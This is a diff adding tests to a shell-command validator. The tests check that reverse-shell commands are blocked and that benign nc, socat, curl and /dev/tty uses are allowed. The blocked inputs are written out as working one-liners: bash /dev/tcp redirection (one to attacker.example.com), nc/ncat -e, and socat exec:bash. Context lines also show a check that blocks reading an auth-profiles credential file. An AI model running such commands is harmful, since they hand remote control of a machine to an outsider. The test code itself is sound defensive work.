@@ -612,6 +612,82 @@ describe("Category K -- sed dangerous operation blocking", () => {
   });
 });
 
+describe("Category L -- network reverse-shell primitives", () => {
+  // BLOCK -- /dev/tcp
+  it("blocks bash -i >& /dev/tcp/host/port (classic reverse shell)", () => {
+    const result = validateCommand("bash -i >& /dev/tcp/127.0.0.1/9999 0>&1");
+    expect(result).not.toBeNull();
+    expect(result).toMatch(/dev\/tcp/i);
+  });
+
+  it("blocks /dev/tcp with hostname", () => {
+    const result = validateCommand("exec 5<>/dev/tcp/attacker.example.com/4444");
+    expect(result).not.toBeNull();
+    expect(result).toMatch(/dev\/tcp/i);
+  });
+
+  it("blocks /dev/tcp via redirected variable construction", () => {
+    const result = validateCommand("H=evil; bash -i >& /dev/tcp/$H/9999 0>&1");
+    expect(result).not.toBeNull();
+    expect(result).toMatch(/dev\/tcp/i);
+  });
+
+  // BLOCK -- nc/ncat -e
+  it("blocks nc -e /bin/bash", () => {
+    const result = validateCommand("nc -e /bin/bash 127.0.0.1 9999");
+    expect(result).not.toBeNull();
+    expect(result).toMatch(/netcat/i);
+  });
+
+  it("blocks ncat -e (variant)", () => {
+    const result = validateCommand("ncat -e /bin/sh 127.0.0.1 9999");
+    expect(result).not.toBeNull();
+    expect(result).toMatch(/netcat/i);
+  });
+
+  it("blocks ncat --exec long form via -e contraction", () => {
+    // The pattern matches `-e` token; long --exec is a different attack but
+    // most ncat builds also accept -e.
+    const result = validateCommand("ncat 127.0.0.1 9999 -e bash");
+    expect(result).not.toBeNull();
+    expect(result).toMatch(/netcat/i);
+  });
+
+  // BLOCK -- socat exec:
+  it("blocks socat with exec: target", () => {
+    const result = validateCommand("socat tcp:127.0.0.1:9999 exec:bash");
+    expect(result).not.toBeNull();
+    expect(result).toMatch(/socat/i);
+  });
+
+  it("blocks socat with exec: and bash -li", () => {
+    const result = validateCommand("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:9999");
+    expect(result).not.toBeNull();
+    expect(result).toMatch(/socat/i);
+  });
+
+  // ALLOW -- legitimate non-reverse-shell uses of these tools
+  it("allows nc port scan without -e", () => {
+    expect(validateCommand("nc -zv example.com 80")).toBeNull();
+  });
+
+  it("allows nc to send a file (no -e)", () => {
+    expect(validateCommand("nc -w 5 example.com 1234 < /workspace/file")).toBeNull();
+  });
+
+  it("allows socat without exec target", () => {
+    expect(validateCommand("socat - tcp:example.com:80")).toBeNull();
+  });
+
+  it("allows curl to a /dev/null path (does not match /dev/tcp/)", () => {
+    expect(validateCommand("curl https://example.com -o /dev/null")).toBeNull();
+  });
+
+  it("allows reading /dev/tty (does not match /dev/tcp/)", () => {
+    expect(validateCommand("read -p prompt < /dev/tty")).toBeNull();
+  });
+});
+
 describe("Category D + F -- auth-profiles.json blocking", () => {
   describe("read block (Category D)", () => {
     it("blocks cat ~/.comis/auth-profiles.json", () => {
